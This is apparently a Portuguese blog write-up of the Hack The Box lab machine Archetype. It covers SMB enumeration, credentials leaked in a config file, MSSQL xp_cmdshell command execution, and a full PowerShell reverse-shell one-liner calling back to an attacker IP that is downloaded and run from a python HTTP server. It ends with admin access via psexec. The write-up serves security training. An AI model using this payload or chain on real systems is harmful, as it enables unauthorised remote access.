<p><img src="/img/htb/htb-archetype-logo.png" /></p>

<p><br /></p>

<table>
  <thead>
    <tr>
      <th>Nome</th>
      <th>Archetype</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>IP</td>
      <td>10.10.10.27</td>
    </tr>
    <tr>
      <td>Pontos</td>
      <td>0</td>
    </tr>
    <tr>
      <td>OS</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Nível</td>
      <td>Very Easy</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h2 id="recon">RECON</h2>

<h3 id="nmap">Nmap</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Archetype]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.10.27 <span class="nt">--min-rate</span><span class="o">=</span>512
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Issuer: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-09-05T19:35:06
| Not valid after:  2051-09-05T19:35:06
| MD5:   0f97 d62c 8d46 e595 8b83 982b eb14 769f
|_SHA-1: 795d c811 74ec cd90 80e3 27d6 bb77 796c a2f0 d9d4
|_ssl-date: 2021-09-05T19:47:03+00:00<span class="p">;</span> <span class="nt">-35m18s</span> from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC

Network Distance: 2 hops
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>265 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 48m42s, deviation: 3h07m52s, median: <span class="nt">-35m18s</span>
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 <span class="o">(</span>Windows Server 2019 Standard 6.3<span class="o">)</span>
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE<span class="se">\x</span>00
|   Workgroup: WORKGROUP<span class="se">\x</span>00
|_  System <span class="nb">time</span>: 2021-09-05T12:46:55-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2021-09-05T19:46:54
|_  start_date: N/A


</code></pre></div></div>
<p>Encontramos várias portas abertas nesta máqina, vamo começar pela <code class="language-plaintext highlighter-rouge">445 - SMB</code>.</p>

<h3 id="smb">SMB</h3>

<p>Vamos tentar uma conex]ao sem credenciais para verificar null session no SMB.</p>

<p><img src="/img/htb/htb-archetype-1.png" /></p>

<p>Temos acesso a algubs compartilhamentos, em expecial <code class="language-plaintext highlighter-rouge">backups</code>, vamos enumerá-lo.</p>

<p><img src="/img/htb/htb-archetype-2.png" /></p>

<p>Encontramos o arquivo, <code class="language-plaintext highlighter-rouge">prod.dtsConfig</code>, após baixarmos, e analizarmos, encontramos algumas informaçõs valiosas.</p>

<p><img src="/img/htb/htb-archetype-3.png" /></p>

<p>Ecnontramos as credenciais para um MSSQL: <code class="language-plaintext highlighter-rouge">ARCHETYPE\sql_svc:M3g4c0rp123</code>.</p>

<p>Em posse das credenciais, podemos tentar uma conex]ao remota utilizando o <code class="language-plaintext highlighter-rouge">mssqlclient.py</code>.</p>

<p><img src="/img/htb/htb-archetype-4.png" /></p>

<p>Conseguimos um acesso ao MSSQL, ótimo!</p>

<p>Podemos utilizar a função <code class="language-plaintext highlighter-rouge">IS_SRVROLEMEMBER</code>, para verificar se o usuário <code class="language-plaintext highlighter-rouge">sql_svc</code> tem privilégios administrativos.</p>

<p><img src="/img/htb/htb-archetype-5.png" /></p>

<p>O MSSQL retornou <code class="language-plaintext highlighter-rouge">1</code>, o que significa que temos privilégios administrativos.</p>

<p>Agora precisamos de uma forma de conseguir a leak de algum arquivo, ou melhor, um shell.</p>

<p>Existe uma funsão do MSSQL que permite executar comandos via query, podemos encontrar na pŕopria documentação da Microsoft <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15">aqui</a>.</p>

<p>Vamos seguir os passos da documentação e testar algum comando.</p>

<p><img src="/img/htb/htb-archetype-6.png" /></p>

<p>Ótimo, conseguimos um RCE através do MSSQL, agora podemos tentar um reverse shell através de comandos no PowerSHell.</p>

<p>Primeiro vamos criar um payload de uma linha em power shell e salvá-lo no arquivo <code class="language-plaintext highlighter-rouge">shell.ps1</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Archetype]
└─<span class="nv">$ </span><span class="nb">cat </span>shell.ps1
<span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">"10.10.14.251"</span>,8443<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="nv">$bytes</span> <span class="o">=</span> 0..65535|%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> <span class="nt">-ne</span> 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object <span class="nt">-TypeName</span> System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">"# "</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
</code></pre></div></div>
<p>Agora vamos iniciar um server http com python <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code>.</p>

<p><img src="/img/htb/htb-archetype-7.png" /></p>

<p>Agora setamos um <code class="language-plaintext highlighter-rouge">netcat</code> na porta 8443 que setamos em nosso payload.</p>

<p><img src="/img/htb/htb-archetype-8.png" /></p>

<p>Com tudo pronto, podemos enviar um payload em Power Shell no MSSQL, que vai fazer o download do script em nosso HTTP server e em seguida executá-lo, nos dando um reverse shell no netcat que abrimos.</p>

<p><img src="/img/htb/htb-archetype-9.png" /></p>

<p>Se olharmos em nosso servidor HTTP, podemos ver que houve uma requisição vinda da Archetype.</p>

<p><img src="/img/htb/htb-archetype-10.png" /></p>

<p>E em nosso netcat, temos nosso reverse shell!!!</p>

<p><img src="/img/htb/htb-archetype-11.png" /></p>

<p>Ótimo, estamos dentro do host da Archetype, dentro do Desktop do usuário <code class="language-plaintext highlighter-rouge">sql_svc</code>, encontramos a flag do usuário.</p>

<p><img src="/img/htb/htb-archetype-12.png" /></p>

<h2 id="escalação-de-privilégios">Escalação de privilégios</h2>

<p>Após um bom tempo de enumeração local, decidi checar se há algum histórico do Power Shell no usuário e descobri uma informação extremamente importante.</p>

<p><img src="/img/htb/htb-archetype-13.png" /></p>

<p>Encontramos as credenciais do administrador: <code class="language-plaintext highlighter-rouge">administrator:MEGACORP_4dm1n!!</code>.</p>

<p>Em posse destas credenciais, podemos tentar um acesso remoto ao host utilizando o <code class="language-plaintext highlighter-rouge">psexec.py</code>.</p>

<p><img src="/img/htb/htb-archetype-14.png" /></p>

<p>E conseguimos nosso shell com privilégios administrativos no Host Archetype.</p>

<p>A flag do Administrator está em seu Desktop.</p>

<p><img src="/img/htb/htb-archetype-15.png" /></p>

<p>E comprometemos o server!!
<br /></p>

<p><img src="/img/htb/hackerman.gif" />
<br /></p>

